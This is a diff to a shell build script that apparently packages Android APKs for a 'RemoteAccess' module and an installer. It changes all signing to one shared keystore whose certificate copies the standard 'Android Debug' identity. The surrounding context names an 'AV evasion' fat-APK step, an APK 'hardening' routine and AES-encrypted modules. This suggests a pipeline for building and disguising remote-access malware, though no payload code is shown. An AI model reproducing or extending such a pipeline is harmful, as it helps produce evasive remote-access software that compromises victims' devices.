@@ -1444,6 +1444,36 @@ else
     echo "  Installer keystore          (CN=$INST_KS_CN, O=$INST_KS_ORG, C=$INST_KS_COUNTRY)"
 fi
 
+# ── Single shared debug keystore (one key for module, installer, installer-large) ──
+DEBUG_KS_PATH="$ROOT_DIR/app/ks-debug.p12"
+DEBUG_KS_META="$ROOT_DIR/app/ks-debug.meta"
+DEBUG_KS_ALIAS="androiddebugkey"
+if [ ! -f "$DEBUG_KS_PATH" ] || [ ! -f "$DEBUG_KS_META" ]; then
+    echo "  Generating persistent debug keystore (first build only)..."
+    DEBUG_KS_SPASS=$(python3 -c "import secrets; print(secrets.token_urlsafe(32))")
+    DEBUG_KS_KPASS="$DEBUG_KS_SPASS"
+    rm -f "$DEBUG_KS_PATH"
+    keytool -genkeypair \
+        -storetype PKCS12 \
+        -keystore   "$DEBUG_KS_PATH" \
+        -alias      "$DEBUG_KS_ALIAS" \
+        -keyalg     RSA \
+        -keysize    2048 \
+        -validity   9125 \
+        -storepass  "$DEBUG_KS_SPASS" \
+        -keypass    "$DEBUG_KS_KPASS" \
+        -dname      "CN=Android Debug, OU=Android, O=Android, L=Mountain View, ST=California, C=US" \
+        -sigalg     SHA256withRSA \
+        2>&1 | sed 's/^/    /'
+    printf '%s\n' "$DEBUG_KS_ALIAS" "$DEBUG_KS_SPASS" "$DEBUG_KS_KPASS" > "$DEBUG_KS_META"
+    echo "  Debug keystore created"
+else
+    echo "  Reusing debug keystore  (same cert for all APKs)"
+    DEBUG_KS_ALIAS=$( sed -n '1p' "$DEBUG_KS_META")
+    DEBUG_KS_SPASS=$( sed -n '2p' "$DEBUG_KS_META")
+    DEBUG_KS_KPASS=$( sed -n '3p' "$DEBUG_KS_META")
+fi
+
 # ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
 echo ""
 echo "==> Ensuring Python build tools..."
@@ -2031,11 +2061,11 @@ else
 fi
 }   # ── end harden_apk() ─────────────────────────────────────────────────────
 
-# Harden the Module APK — use its own unique per-build keystore
-KEYSTORE="$MODULE_KS_PATH"
-KEY_ALIAS="$MODULE_KS_ALIAS"
-STORE_PASS="$MODULE_KS_SPASS"
-KEY_PASS="$MODULE_KS_KPASS"
+# Harden the Module APK — signed with the shared debug keystore
+KEYSTORE="$DEBUG_KS_PATH"
+KEY_ALIAS="$DEBUG_KS_ALIAS"
+STORE_PASS="$DEBUG_KS_SPASS"
+KEY_PASS="$DEBUG_KS_KPASS"
 harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 
 # ── 11b. Fat standalone APK (~40 MB, AV evasion) ─────────────────────────────
@@ -2110,10 +2140,10 @@ PYEOF
         "$ZIPALIGN" -p -f 4 "$FAT_TMP" "$FAT_ALIGNED" > /dev/null
         rm -f "$FAT_TMP"
         "$APKSIGNER" sign \
-            --ks "$MODULE_KS_PATH" \
-            --ks-key-alias "$MODULE_KS_ALIAS" \
-            --ks-pass "pass:$MODULE_KS_SPASS" \
-            --key-pass  "pass:$MODULE_KS_KPASS" \
+            --ks "$DEBUG_KS_PATH" \
+            --ks-key-alias "$DEBUG_KS_ALIAS" \
+            --ks-pass "pass:$DEBUG_KS_SPASS" \
+            --key-pass  "pass:$DEBUG_KS_KPASS" \
             --v1-signing-enabled false \
             --v2-signing-enabled true \
             --v3-signing-enabled true \
@@ -2245,11 +2275,11 @@ PYEOF
     if [ -n "$INSTALLER_SRC" ] && [ -f "$INSTALLER_SRC" ]; then
         cp "$INSTALLER_SRC" "$ROOT_DIR/apk-output/Installer-release.apk"
         echo "  Installer APK: apk-output/Installer-release.apk"
-        # Harden the Installer APK — use its own separate unique keystore
-        KEYSTORE="$INST_KS_PATH"
-        KEY_ALIAS="$INST_KS_ALIAS"
-        STORE_PASS="$INST_KS_SPASS"
-        KEY_PASS="$INST_KS_KPASS"
+        # Harden the Installer APK — signed with the shared debug keystore
+        KEYSTORE="$DEBUG_KS_PATH"
+        KEY_ALIAS="$DEBUG_KS_ALIAS"
+        STORE_PASS="$DEBUG_KS_SPASS"
+        KEY_PASS="$DEBUG_KS_KPASS"
         harden_apk "$ROOT_DIR/apk-output/Installer-release.apk"
 
         # ── 12b. Fat standalone Installer APK (~25 MB) ───────────────────────────
@@ -2302,10 +2332,10 @@ PYEOF
                 "$ZIPALIGN" -p -f 4 "$INST_FAT_TMP" "$INST_FAT_ALIGNED" > /dev/null
                 rm -f "$INST_FAT_TMP"
                 "$APKSIGNER" sign \
-                    --ks "$INST_KS_PATH" \
-                    --ks-key-alias "$INST_KS_ALIAS" \
-                    --ks-pass "pass:$INST_KS_SPASS" \
-                    --key-pass  "pass:$INST_KS_KPASS" \
+                    --ks "$DEBUG_KS_PATH" \
+                    --ks-key-alias "$DEBUG_KS_ALIAS" \
+                    --ks-pass "pass:$DEBUG_KS_SPASS" \
+                    --key-pass  "pass:$DEBUG_KS_KPASS" \
                     --v1-signing-enabled false \
                     --v2-signing-enabled true \
                     --v3-signing-enabled true \
